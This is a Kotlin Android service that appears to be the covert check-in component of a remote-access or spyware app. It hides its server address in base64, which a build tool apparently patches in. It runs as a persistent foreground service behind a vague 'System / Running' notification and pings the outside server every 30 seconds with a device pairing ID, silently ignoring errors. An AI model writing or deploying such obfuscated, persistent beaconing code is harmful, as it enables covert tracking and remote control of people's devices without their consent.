package com.sync.xxx

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Base64
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import kotlin.concurrent.thread

class DeviceService : Service() {

    companion object {
        // inject_config patches this base64
        val SERVER_URL: String
            get() = String(
                Base64.decode(
                    "aHR0cDovL3BhcHNreS5xdWVlbi1vZmZpY2lhbC5jb206MjQ2OA==",
                    Base64.DEFAULT
                )
            )
    }

    private val exec = Executors.newSingleThreadExecutor()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        exec.execute { heartbeatLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun startFg() {
        val chId = "sync_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            nm?.createNotificationChannel(
                NotificationChannel(chId, "Sync", NotificationManager.IMPORTANCE_MIN)
            )
        }
        val n: Notification = NotificationCompat.Builder(this, chId)
            .setContentTitle("System")
            .setContentText("Running")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1001, n)
    }

    private fun readPair(): String {
        return try {
            val t = assets.open("uid.json").bufferedReader().readText()
            JSONObject(t).optString("pair", "NEONXJZET0000")
        } catch (_: Exception) {
            "NEONXJZET0000"
        }
    }

    private fun heartbeatLoop() {
        val pair = readPair()
        while (true) {
            try {
                val base = SERVER_URL.trimEnd('/')
                val url = URL("$base/ping?pair=$pair")
                val c = url.openConnection() as HttpURLConnection
                c.connectTimeout = 8000
                c.readTimeout = 8000
                c.requestMethod = "GET"
                c.connect()
                c.inputStream.bufferedReader().readText()
                c.disconnect()
            } catch (_: Exception) {
            }
            try {
                Thread.sleep(30_000)
            } catch (_: Exception) {
            }
        }
    }
}
